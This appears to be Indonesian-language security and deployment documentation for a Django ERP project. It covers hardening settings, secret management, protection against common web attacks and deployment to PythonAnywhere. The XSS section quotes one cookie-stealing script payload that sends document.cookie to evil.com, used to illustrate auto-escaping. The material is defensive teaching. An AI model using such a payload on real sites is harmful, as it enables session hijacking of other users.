# 🔒 17 — Keamanan & Deployment — Panduan Lengkap

## DAFTAR ISI
- [A. Kenapa Keamanan Penting?](#a-kenapa-keamanan-penting)
- [B. Arsitektur Keamanan Django](#b-arsitektur-keamanan-django)
- [C. Konfigurasi Security Settings](#c-konfigurasi-security-settings)
- [D. Manajemen Secret Key](#d-manajemen-secret-key)
- [E. File .env & .gitignore](#e-file-env-dan-gitignore)
- [F. Proteksi dari Serangan Cyber](#f-proteksi-dari-serangan-cyber)
- [G. Deployment ke PythonAnywhere](#g-deployment-ke-pythonanywhere)
- [H. Checklist Keamanan Deployment](#h-checklist-keamanan-deployment)

---

## A. Kenapa Keamanan Penting?

### Tanpa Security Hardening:
```
Penyerang → http://site.com/debug/ → Lihat SEMUA kode sumber
Penyerang → Curi cookie session → Login sebagai admin
Penyerang → SQL Injection → Akses database
Penyerang → XSS → Sisipkan JavaScript jahat di halaman
Penyerang → Clickjacking → Bungkus situs dalam iframe palsu
```

### Dengan Security Hardening:
```
Penyerang → Semua request HTTPS (terenkripsi)
Penyerang → Cookie tidak bisa dicuri (Secure + HttpOnly)
Penyerang → Tidak bisa embed di iframe (X-Frame-Options: DENY)
Penyerang → Tidak bisa bypass CSRF (token + SameSite cookie)
Penyerang → Tidak bisa sniff tipe file (Content-Type-Nosniff)
```

---

## B. Arsitektur Keamanan Django

### Diagram Layer Keamanan:

```
┌────────────────────────────────────────────────────────────────┐
│                     BROWSER USER                               │
└──────────────────────────┬─────────────────────────────────────┘
                           │ HTTPS (TLS 1.3)
                           ▼
┌────────────────────────────────────────────────────────────────┐
│                   REVERSE PROXY                                │
│               (PythonAnywhere/Nginx)                           │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO',    │ │
│  │                            'https')                      │ │
│  └──────────────────────────────────────────────────────────┘ │
└──────────────────────────┬─────────────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────────────┐
│                  DJANGO MIDDLEWARE STACK                        │
│                                                                │
│  1. SecurityMiddleware                                         │
│     ├── SECURE_SSL_REDIRECT → HTTP → HTTPS                    │
│     ├── SECURE_HSTS_SECONDS → Browser wajib HTTPS             │
│     └── SECURE_CONTENT_TYPE_NOSNIFF → Cegah MIME sniffing     │
│                                                                │
│  2. GZipMiddleware → Kompres response untuk kecepatan          │
│                                                                │
│  3. WhiteNoiseMiddleware → Serve static files (CSS/JS/gambar)  │
│                                                                │
│  4. SessionMiddleware                                          │
│     ├── SESSION_COOKIE_SECURE → Cookie hanya via HTTPS         │
│     ├── SESSION_COOKIE_HTTPONLY → Tidak bisa diakses JavaScript │
│     └── SESSION_COOKIE_SAMESITE → Cegah CSRF via cookie        │
│                                                                │
│  5. CsrfViewMiddleware                                         │
│     ├── CSRF_COOKIE_SECURE → Token hanya via HTTPS             │
│     └── CSRF_TRUSTED_ORIGINS → Domain yang diizinkan           │
│                                                                │
│  6. XFrameOptionsMiddleware                                    │
│     └── X_FRAME_OPTIONS = "DENY" → Cegah clickjacking         │
│                                                                │
│  7. ActivityLogMiddleware → Catat semua aktivitas user          │
└──────────────────────────┬─────────────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────────────┐
│                    DJANGO VIEWS                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │ @login_required → Wajib login                            │ │
│  │ RBAC Permission → Cek role + can_view/create/edit/delete │ │
│  │ dispatch() override → Cegah edit SO setelah confirmed    │ │
│  │ db.transaction.atomic() → Rollback kalau error           │ │
│  │ select_for_update() → Lock baris stok cegah race cond.  │ │
│  │ Validasi stok negatif → Cegah stok < 0                  │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────┘
```

### File-file Keamanan Utama:

| File | Fungsi |
|------|--------|
| `config/settings.py` | Semua konfigurasi keamanan Django |
| `.env` | Variabel rahasia (SECRET_KEY, passwords) |
| `.env.example` | Template .env (AMAN untuk di-commit) |
| `.gitignore` | Lindungi file rahasia dari Git |
| `apps/core/permissions.py` | Sistem RBAC (Role-Based Access Control) |
| `apps/core/context_processors.py` | Permission checker untuk template |
| `apps/core/mixins.py` | Permission mixin untuk class-based views |
| `apps/activity_log/middleware.py` | Catat semua aktivitas user |

---

## C. Konfigurasi Security Settings

### Lokasi: `config/settings.py`

### Pengaturan SELALU Aktif (Development & Production):

```python
# Cegah clickjacking: halaman tidak bisa di-embed dalam iframe situs lain
# Serangan: Penyerang membuat situs palsu → embed halaman kita di iframe
# → User klik tombol di iframe tanpa sadar → Aksi berbahaya terjadi
X_FRAME_OPTIONS = "DENY"

# Cegah browser menebak tipe konten (MIME sniffing attack)
# Serangan: Penyerang upload file .txt berisi JavaScript
# → Browser menebak itu JavaScript → Eksekusi kode jahat
SECURE_CONTENT_TYPE_NOSNIFF = True
```

### Pengaturan KHUSUS Production (`DEBUG=False`):

```python
if not DEBUG:
    # ─── HTTPS ENFORCEMENT ─────────────────────────────
    
    # Redirect semua HTTP ke HTTPS
    SECURE_SSL_REDIRECT = True
    
    # HSTS: Browser WAJIB pakai HTTPS selama 1 tahun
    # Bahkan jika user ketik http:// → browser otomatis ubah ke https://
    SECURE_HSTS_SECONDS = 31536000       # 1 tahun = 365 × 24 × 60 × 60
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True  # Berlaku juga untuk subdomain
    SECURE_HSTS_PRELOAD = True             # Daftarkan ke browser preload list
    
    # ─── COOKIE SECURITY ──────────────────────────────
    
    # Cookie session hanya dikirim via HTTPS
    # Tanpa ini: penyerang di jaringan WiFi bisa baca cookie → hijack session
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
    
    # ─── PROXY SUPPORT ────────────────────────────────
    
    # PythonAnywhere menggunakan reverse proxy (Nginx → Django)
    # Header ini memberitahu Django bahwa request aslinya HTTPS
    SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
    
    # ─── REFERRER POLICY ──────────────────────────────
    
    # Jangan kirim URL lengkap ke situs eksternal
    # Contoh: dari /admin/secret-page/ ke google.com → hanya kirim domain
    SECURE_REFERRER_POLICY = "strict-origin-when-cross-origin"

else:
    # Development: cookie bisa dikirim tanpa HTTPS (localhost)
    SESSION_COOKIE_SECURE = False
```

### Penjelasan Setiap Setting:

| Setting | Nilai | Fungsi |
|---------|-------|--------|
| `X_FRAME_OPTIONS` | `"DENY"` | Cegah clickjacking (iframe) |
| `SECURE_CONTENT_TYPE_NOSNIFF` | `True` | Cegah MIME sniffing |
| `SECURE_SSL_REDIRECT` | `True` (prod) | HTTP → HTTPS redirect |
| `SECURE_HSTS_SECONDS` | `31536000` | Browser wajib HTTPS 1 tahun |
| `SESSION_COOKIE_SECURE` | `True` (prod) | Cookie hanya via HTTPS |
| `CSRF_COOKIE_SECURE` | `True` (prod) | CSRF token hanya via HTTPS |
| `SESSION_COOKIE_HTTPONLY` | `True` | Cookie tidak bisa diakses JS |
| `SESSION_COOKIE_SAMESITE` | `"Lax"` | Cegah CSRF via cookie |
| `SECURE_PROXY_SSL_HEADER` | `(...)` | Support reverse proxy |
| `SECURE_REFERRER_POLICY` | `"strict-origin..."` | Batasi info referrer |

---

## D. Manajemen Secret Key

### Apa itu SECRET_KEY?

SECRET_KEY adalah string rahasia yang digunakan Django untuk:
- **Enkripsi session** → Jika bocor, penyerang bisa memalsukan session
- **CSRF token** → Jika bocor, proteksi CSRF tidak berguna
- **Password hashing salt** → Jika bocor, password lebih mudah di-crack
- **Cryptographic signing** → Jika bocor, data signed bisa dipalsukan

### Konfigurasi di Project Ini:

```python
# config/settings.py

import secrets  # Modul Python untuk generate random string aman

# Jika SECRET_KEY tidak diset di .env, generate random key
# AMAN untuk development (key baru tiap restart)
# Untuk PRODUKSI: WAJIB set di .env agar konsisten!
SECRET_KEY = os.environ.get("SECRET_KEY", default=secrets.token_urlsafe(50))
```

### Generate SECRET_KEY untuk Production:

```bash
# Jalankan di terminal:
python -c "import secrets; print(secrets.token_urlsafe(50))"

# Output contoh:
# Yx2kQ9dF7bN3mR5vT8wJ1sL6pA4hC0eG_KxUzMnOiPqWrYtSjDfHgBbVcXaZdEwQq
```

### ⚠ PERINGATAN:

```
✅ Development: SECRET_KEY otomatis di-generate (tidak perlu set manual)
                Key berubah tiap server restart — TIDAK masalah di dev

❌ Production:  WAJIB set SECRET_KEY di file .env
                Jika tidak, session user reset setiap server restart!
                User harus login ulang setiap kali server di-restart
```

---

## E. File .env dan .gitignore

### Struktur File Environment:

```
starter-kit/
├── .env              ← File RAHASIA (JANGAN commit ke Git!)
├── .env.example      ← Template (AMAN untuk commit)
├── .gitignore         ← Berisi aturan: ".env" = jangan commit
└── config/
    └── settings.py    ← Baca variabel dari .env via python-dotenv
```

### File `.env.example` (Template — AMAN):

```bash
# [WAJIB DIISI] Secret key untuk keamanan Django
SECRET_KEY=

# Mode debug: True untuk development, False untuk production
DEBUG=True

# Domain yang diizinkan mengakses aplikasi
ALLOWED_HOSTS=localhost,127.0.0.1

# Domain yang diizinkan mengirim form (CSRF protection)
CSRF_TRUSTED_ORIGINS=http://127.0.0.1,http://localhost
```

### File `.env` Contoh untuk Production:

```bash
SECRET_KEY=Yx2kQ9dF7bN3mR5vT8wJ1sL6pA4hC0eG_KxUzMnOiPq
DEBUG=False
DJANGO_ENVIRONMENT=production
ALLOWED_HOSTS=serp.pythonanywhere.com
CSRF_TRUSTED_ORIGINS=https://serp.pythonanywhere.com
BASE_URL=https://serp.pythonanywhere.com
```

### File `.gitignore` — Proteksi:

```gitignore
# Environment variables (RAHASIA — JANGAN commit!)
# File .env berisi SECRET_KEY, password database, API keys, dll
# Jika file ini ikut ke GitHub, semua rahasia TERBUKA ke publik!
.env
.env.local
.env.production

# Database (jangan commit — berisi data user)
*.sqlite3
*.sqlite3-journal

# Media uploads (jangan commit file upload user)
media/
```

---

## F. Proteksi dari Serangan Cyber

### 1. Cross-Site Scripting (XSS)

**Apa itu:** Penyerang menyisipkan kode JavaScript jahat ke halaman web.

```
Contoh serangan:
User memasukkan nama produk: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
→ Jika tidak di-escape, JavaScript ini akan dieksekusi di browser user lain!
```

**Proteksi Django:**
```html
<!-- Django OTOMATIS escape HTML di template -->
{{ produk.nama }}
<!-- Output: &lt;script&gt;...&lt;/script&gt; (tidak dieksekusi) -->

<!-- JANGAN gunakan |safe kecuali data PASTI aman -->
{{ user_input|safe }}  ← BERBAHAYA! Bisa XSS jika user_input mengandung <script>
```

**Proteksi tambahan:**
```python
# settings.py
SECURE_CONTENT_TYPE_NOSNIFF = True  # Cegah browser menebak tipe file
SESSION_COOKIE_HTTPONLY = True       # Cookie tidak bisa diakses JavaScript
```

### 2. Cross-Site Request Forgery (CSRF)

**Apa itu:** Penyerang membuat user mengirim request tanpa sadar.

```
Contoh serangan:
1. Admin login ke ERP
2. Admin buka email → klik link jahat
3. Link membuat POST request ke /users/delete/1/ menggunakan session admin
4. User terhapus tanpa admin tahu!
```

**Proteksi Django:**
```html
<!-- SEMUA form POST wajib pakai {% csrf_token %} -->
<form method="POST">
    {% csrf_token %}  <!-- Token unik per session, penyerang tidak bisa tebak -->
    <input name="nama" value="Produk Baru">
    <button type="submit">Simpan</button>
</form>
```

**Proteksi tambahan:**
```python
# settings.py
CSRF_COOKIE_SECURE = True          # CSRF token hanya via HTTPS (production)
SESSION_COOKIE_SAMESITE = "Lax"    # Cookie tidak dikirim dari situs lain
CSRF_TRUSTED_ORIGINS = [...]       # Hanya domain ini yang boleh submit form
```

### 3. Clickjacking

**Apa itu:** Penyerang membungkus halaman kita dalam iframe transparan.

```
Contoh serangan:
1. Penyerang buat halaman: "Klik untuk menang hadiah!"
2. Di belakang tombol ada iframe transparan halaman /users/delete/1/
3. User klik tombol → sebenarnya klik hapus user!
```

**Proteksi:**
```python
# settings.py — SELALU aktif
X_FRAME_OPTIONS = "DENY"  # Browser menolak menampilkan situs kita di iframe
```

### 4. Man-in-the-Middle (MITM)

**Apa itu:** Penyadapan data di jaringan (WiFi publik, ISP nakal).

```
Contoh serangan:
1. User login di WiFi kafe
2. Penyerang di jaringan yang sama menyadap traffic
3. Cookie session terlihat di traffic HTTP (tidak terenkripsi)
4. Penyerang copy cookie → login sebagai user tanpa password!
```

**Proteksi:**
```python
# settings.py — aktif saat production
SECURE_SSL_REDIRECT = True         # Paksa HTTPS (terenkripsi)
SECURE_HSTS_SECONDS = 31536000     # Browser wajib HTTPS selama 1 tahun
SESSION_COOKIE_SECURE = True       # Cookie hanya dikirim via HTTPS
```

### 5. Information Disclosure (Kebocoran Informasi)

**Apa itu:** Menampilkan informasi internal ke publik.

```
Contoh serangan:
1. DEBUG=True di production
2. User akses URL yang error → Django tampilkan FULL stack trace
3. Stack trace berisi: path file, versi Python, query database, SECRET_KEY!
```

**Proteksi:**
```python
# settings.py
DEBUG = False  # di production → error tampilkan halaman 404/500 generic

# JANGAN PERNAH:
DEBUG = True   # di production → semua kode sumber terbuka!
```

### 6. Brute Force Login

**Apa itu:** Penyerang mencoba ribuan kombinasi password.

**Proteksi bawaan Django:**
```python
# settings.py — Password validators
AUTH_PASSWORD_VALIDATORS = [
    {"NAME": "...UserAttributeSimilarityValidator"},  # Jangan mirip username
    {"NAME": "...MinimumLengthValidator"},             # Minimal 8 karakter
    {"NAME": "...CommonPasswordValidator"},            # Jangan pakai "password123"
    {"NAME": "...NumericPasswordValidator"},            # Jangan hanya angka
]
```

---

## G. Deployment ke PythonAnywhere

### Langkah-langkah Deployment Aman:

```
1. Upload kode ke PythonAnywhere (via Git)
   $ git clone <repository-url>

2. Buat .env di server (JANGAN commit!)
   $ cp .env.example .env
   $ nano .env
   → Isi SECRET_KEY, set DEBUG=False, dll

3. Install dependencies
   $ pip install -r requirements.txt

4. Collect static files
   $ python manage.py collectstatic

5. Migrate database
   $ python manage.py migrate

6. Jalankan security check
   $ python manage.py check --deploy
   → Harus 0 warnings!

7. Konfigurasi WSGI di PythonAnywhere
   → Arahkan ke config.wsgi:application
```

### Konfigurasi `.env` untuk PythonAnywhere:

```bash
# File: .env (di server PythonAnywhere)

# Generate key: python -c "import secrets; print(secrets.token_urlsafe(50))"
SECRET_KEY=<string-random-50-karakter>

# WAJIB False di production
DEBUG=False

# Environment
DJANGO_ENVIRONMENT=production

# Domain PythonAnywhere
ALLOWED_HOSTS=serp.pythonanywhere.com
CSRF_TRUSTED_ORIGINS=https://serp.pythonanywhere.com
BASE_URL=https://serp.pythonanywhere.com
```

### Verifikasi Keamanan Setelah Deploy:

```bash
# Cek semua setting keamanan
$ python manage.py check --deploy

# Hasil yang diharapkan:
# System check identified no issues (0 silenced).
#
# Jika masih ada WARNING, fix sesuai petunjuknya!
```

---

## H. Checklist Keamanan Deployment

### ✅ Wajib Sebelum Go Live:

| # | Item | Cara Cek |
|---|------|----------|
| 1 | `DEBUG = False` | Cek .env: `DEBUG=False` |
| 2 | `SECRET_KEY` unik & kuat | Generate via `secrets.token_urlsafe(50)` |
| 3 | `.env` tidak di Git | `git status` — .env tidak muncul |
| 4 | `ALLOWED_HOSTS` diisi | Hanya domain produksi |
| 5 | `CSRF_TRUSTED_ORIGINS` diisi | `https://domain-produksi` |
| 6 | HTTPS aktif | Akses `http://` → redirect ke `https://` |
| 7 | `manage.py check --deploy` | 0 warnings |
| 8 | Database di-backup | Sebelum deploy |
| 9 | Password admin sudah kuat | Bukan "admin123" atau "password" |
| 10 | Static files sudah collectstatic | `python manage.py collectstatic` |

### ⚠ Kesalahan Umum:

| Kesalahan | Akibat | Solusi |
|-----------|--------|--------|
| `DEBUG=True` di production | Kode sumber terbuka ke publik | Set `DEBUG=False` di .env |
| SECRET_KEY di-commit ke Git | Penyerang bisa forge session | Hapus dari Git, generate key baru |
| HTTP tanpa HTTPS | Data bisa disadap | Aktifkan HTTPS di PythonAnywhere |
| Password admin lemah | Mudah di-brute force | Ganti ke password kuat (min 12 karakter) |
| `.env` file ikut ke Git | Semua rahasia bocor | Tambah `.env` ke `.gitignore` |

---

*Kembali ke [08_FITUR_MODUL_ERP.md](08_FITUR_MODUL_ERP.md) ←*

*Dokumentasi perbaikan UI/UX: [16_PERBAIKAN_DAN_PENINGKATAN.md](16_PERBAIKAN_DAN_PENINGKATAN.md)*
